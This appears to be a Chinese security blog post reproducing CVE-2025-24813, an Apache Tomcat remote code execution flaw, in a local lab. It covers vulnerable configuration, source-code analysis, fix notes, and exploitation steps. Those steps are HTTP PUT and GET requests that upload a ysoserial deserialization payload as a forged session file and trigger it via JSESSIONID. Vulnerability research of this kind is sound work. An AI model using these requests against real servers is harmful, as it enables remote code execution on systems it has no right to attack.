<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="摸鱼">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  <title>CVE-2025-24813 Apache Tomcat远程代码执行漏洞 - Twings</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期五, 三月 14日 2025, 4:29 下午
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    1.8k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      7 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近看到的漏洞，还涉及到Java、Tomcat和session反序列化，不得不学习了。</p>
<p>还是AI助我。</p>
<span id="more"></span>

<hr>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>先问问AI受影响版本然后再搭建环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">该漏洞影响以下Apache Tomcat版本：</span><br><span class="line"></span><br><span class="line">​9.x系列：9.0.0.M1至9.0.98</span><br><span class="line">​10.x系列：10.1.0.M1至10.1.34</span><br><span class="line">​11.x系列：11.0.0.M1至11.0.2</span><br><span class="line">（完整列表可参考Apache官方公告）</span><br></pre></td></tr></table></figure>

<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>来自AI总结。</p>
<h4 id="文件名处理逻辑缺陷"><a href="#文件名处理逻辑缺陷" class="headerlink" title="文件名处理逻辑缺陷"></a>文件名处理逻辑缺陷</h4><p>当Tomcat的DefaultServlet启用写入功能时，处理PUT请求会将用户提供的文件路径中的斜杠&#x2F;替换为点号.，并将文件写入临时目录（默认为$CATALINA_BASE&#x2F;temp）。例如，攻击者构造的恶意路径&#x2F;WEB-INF&#x2F;web.xml会被转换为WEB-INF.web.xml，绕过目录层级限制。</p>
<h4 id="会话持久化与反序列化链结合"><a href="#会话持久化与反序列化链结合" class="headerlink" title="会话持久化与反序列化链结合"></a>会话持久化与反序列化链结合</h4><p>若应用同时满足以下条件，攻击者可上传恶意序列化文件至会话存储目录，并通过JSESSIONID触发反序列化操作实现RCE：</p>
<ol>
<li>​启用DefaultServlet写入功能​（默认禁用）</li>
<li>支持Partial PUT请求​（默认启用）</li>
<li>​使用Tomcat默认会话存储路径​（需额外配置）</li>
<li>​依赖存在反序列化漏洞的库​（如commons-collections）</li>
</ol>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>去<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.98/bin/">官方网站</a>下载一个9.0.98版本的Tomcat作为漏洞环境，解压即用很方便。</p>
<p>根据漏洞原理，漏洞搭建还需要完成三个步骤。</p>
<h4 id="启用会话持久化"><a href="#启用会话持久化" class="headerlink" title="启用会话持久化"></a>启用会话持久化</h4><p>修改conf&#x2F;context.xml，添加一段：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Store</span> <span class="attr">className</span>=<span class="string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此配置将Session数据存储在默认路径$CATALINA_BASE&#x2F;work&#x2F;Catalina&#x2F;localhost&#x2F;下。</p>
<h4 id="开启DefaultServlet写入权限"><a href="#开启DefaultServlet写入权限" class="headerlink" title="开启DefaultServlet写入权限"></a>开启DefaultServlet写入权限</h4><p>修改conf&#x2F;web.xml文件，找到DefaultServlet配置，添加一段：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此配置允许通过PUT方法写入文件。</p>
<h4 id="引入反序列化漏洞"><a href="#引入反序列化漏洞" class="headerlink" title="引入反序列化漏洞"></a>引入反序列化漏洞</h4><p>在lib目录下面放一个含有反序列化漏洞的jar文件，比如commons-collections的jar文件。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先观察一下PUT请求的处理方式，找到DefaultServlet类的doPut函数，一进来就看到判断readOnly配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.readOnly) &#123;</span><br><span class="line">    <span class="built_in">this</span>.sendNotAllowed(req, resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果将readOnly配置为了false，就会进入写入文件环节：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="built_in">this</span>.getRelativePath(req);</span><br><span class="line"><span class="type">WebResource</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="built_in">this</span>.resources.getResource(path);</span><br><span class="line"><span class="type">Range</span> <span class="variable">range</span> <span class="operator">=</span> <span class="built_in">this</span>.parseContentRange(req, resp);</span><br><span class="line"><span class="keyword">if</span> (range != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">resourceInputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (range == IGNORE) &#123;</span><br><span class="line">            resourceInputStream = req.getInputStream();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> <span class="built_in">this</span>.executePartialPut(req, range, path);</span><br><span class="line">            resourceInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(contentFile);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.resources.write(path, resourceInputStream, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (resource.exists()) &#123;</span><br><span class="line">                resp.setStatus(<span class="number">204</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                resp.setStatus(<span class="number">201</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>executePartialPut函数会替换访问路径中的斜杠&#x2F;为点号.：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">convertedResourcePath</span> <span class="operator">=</span> path.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>再来摸索一下Tomcat和session机制，写一个简单的test.jsp文件，放到webapps&#x2F;test目录下：</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 存储Session --&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">        session.setAttribute(<span class="string">&quot;count&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    %&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 获取Session --&gt;</span><br><span class="line">    &lt;p&gt;访问次数: &lt;%= session.getAttribute(<span class="string">&quot;count&quot;</span>) %&gt;&lt;/p&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;!-- 删除Session --&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;logout.jsp&quot;</span>&gt;退出登录&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>该jsp可以保存和读取session，带上JSESSIONID访问并保存好数据后，关闭Tomcat，Tomcat就会将session的内容序列化后保存到文件里，session文件路径为work&#x2F;Catalina&#x2F;localhost&#x2F;test。</p>
<p>测试一下PUT方法：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/test/xxxxx/session</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000</span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1000/1200</span><br><span class="line"></span><br><span class="line"><span class="language-bash"><span class="built_in">test</span></span></span><br></pre></td></tr></table></figure>

<p>然后在work&#x2F;Catalina&#x2F;localhost&#x2F;test目录下就能看到.xxxxx.session文件了，由于PUT方式上传的虚假session文件跟正经的session文件都在同一个目录下，因此可以上传session，再设置JSESSIONID&#x3D;.xxxxx来触发反序列化，但是session文件的格式看起来并不是简单的仅仅一个序列化对象，而是多种数据的结构体。</p>
<p>观察一下session的读取方式，根据修改了的配置文件，session持久化保存需要配置的类为PersistentManager和FileStore，将Tomcat的lib目录导入IDEA项目搜索一下就能找到类对应的字节码了。</p>
<p>找到FileStore类的save函数，关键代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file.getAbsolutePath());</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(fos));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ((StandardSession)session).writeObjectData(oos);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">            var9.addSuppressed(var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> var9;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    oos.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用StandardSession类的writeObjectData函数将session序列化后写入文件中，后面会进入到doWriteObject函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doWriteObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.creationTime);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.lastAccessedTime);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.maxInactiveInterval);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.isNew);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.isValid);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.thisAccessedTime);</span><br><span class="line">    stream.writeObject(<span class="built_in">this</span>.id);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，session文件中确实存在多种序列化数据，但是也可以看到序列化过程统一使用的是writeObject，无论是long还是其他类型的数据，也就是说我们可以不管它的结构，只需要在session文件中存放一个序列化对象，就能触发反序列化了。</p>
<p>再观察一下反序列化过程，找到doReadObject函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">this</span>.authType = <span class="literal">null</span>;</span><br><span class="line"><span class="built_in">this</span>.creationTime = (Long)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.lastAccessedTime = (Long)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.maxInactiveInterval = (Integer)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.isNew = (Boolean)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.isValid = (Boolean)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.thisAccessedTime = (Long)stream.readObject();</span><br><span class="line"><span class="built_in">this</span>.principal = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>先readObject再强行类型转换，那思路通。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先把带有反序列化漏洞的commons-collections.jar放到webapps&#x2F;test&#x2F;lib目录下，再使用ysoserial生成一个序列化数据文件，同时base64编码一下，结果试了一下都不成功。</p>
<p>只能开始尝试调试Tomcat了，在IDEA中新建一个webapp项目，然后引入Tomcat的lib目录，再把commons-collections.jar放到lib目录下，最后配置本地Tomcat启动。</p>
<p>根据启动时的命令行信息，IDEA启动的Tomcat工作目录在用户的\AppData\Local\JetBrains\IntelliJIdea2024.3\tomcat\目录下，部署的目录为tomcat_war_exploded，因此需要发包：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/tomcat_war_exploded/xxxxx/session</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1000</span><br><span class="line"><span class="attribute">Content-Range</span><span class="punctuation">: </span>bytes 0-1000/1200</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="template-variable">&#123;&#123;<span class="name">base64decode</span>(<span class="name">序列化数据</span>)&#125;&#125;</span><span class="language-xml">&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>然后在工作目录的work\Catalina\localhost\tomcat_war_exploded目录下能看到上传的session文件，也可以给class文件下断点调试了。</p>
<p>然后带上JSESSIONID访问并且调试一下：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tomcat_war_exploded/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=.xxxxx</span><br></pre></td></tr></table></figure>

<p>发现问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.StreamCorruptedException: invalid stream header: FFFE08E1</span><br></pre></td></tr></table></figure>

<p>看起来是Windows的锅，确实看base64后的序列化数据开头就不对劲。</p>
<p>直接使用IDEA打开ysoserial，重新生成base64编码后的payload再次尝试：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">Serializer.serialize(object, bos);</span><br><span class="line"><span class="type">String</span> <span class="variable">serializedBytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getEncoder().encode(bos.toByteArray()));</span><br><span class="line">System.out.println(serializedBytes);</span><br></pre></td></tr></table></figure>

<p>成功触发反序列化漏洞。</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>根据AI：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">代码层修复细节</span><br><span class="line">官方在DefaultServlet的doPut方法中增加安全检查，限制临时文件路径的生成规则，避免用户输入的/被替换为.后绕过目录限制。具体修改涉及对executepartialput方法的调用逻辑。</span><br></pre></td></tr></table></figure>

<p>修改了executePartialPut函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">tempDir</span> <span class="operator">=</span> (File)<span class="built_in">this</span>.getServletContext().getAttribute(<span class="string">&quot;javax.servlet.context.tempdir&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">contentFile</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;put-part-&quot;</span>, (String)<span class="literal">null</span>, tempDir);</span><br><span class="line"><span class="type">RandomAccessFile</span> <span class="variable">randAccessContentFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(contentFile, <span class="string">&quot;rw&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>删掉了将&#x2F;变成.的代码。</p>
<hr>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg5NTg4MTEwNg==&mid=2247484054&idx=1&sn=cc17fdf41c20b0cf942ab2679acca3e3&chksm=c1d75edd68de6ac7e888624a0de354499ec85904f4cabebc9fd3de701268429414d338b610af#rd">Tomcat CVE-2025-24813 RCE复现(含环境下载地址)</a></p>
<p><a href="https://cn-sec.com/archives/3833766.html">汤姆猫最新CVE复现及分析</a></p>

            </div>
            <hr>
            <div>
              <p>
                
                
                  <span>
                <i class="iconfont icon-tag"></i>
                    
                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
                    
                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
                    
                      <a class="hover-with-bg" href="/tags/Tomcat/">Tomcat</a>
                    
                  </span>
                
              </p>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <div class="post-prev col-12 col-md-6">
                    
                      <a href="/2025/07/22/hello-world/">
                        <i class="fa fa-chevron-left"></i>
                        <span>Hello World</span>
                      </a>
                    
                  </div>
                  <div class="post-next col-12 col-md-6">
                    
                      <a href="/2025/03/13/%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
                        <span>高版本下的JNDI注入学习</span>
                        <i class="fa fa-chevron-right"></i>
                      </a>
                    
                  </div>
                </div>
              
            </div>

              
          </div>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc-start"></div>
<div id="toc">
  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
    </div>
    

    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
<script  src="/js/main.js" ></script>


  <script  src="/js/lazyload.js" ></script>



  
  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var navHeight = $('#navbar').height();
      var toc = $('#toc');
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;
      var tocLimMax = 2 * boardTop + boardCtn.height();

      $(window).scroll(function () {
        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "CVE-2025-24813 Apache Tomcat远程代码执行漏洞&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
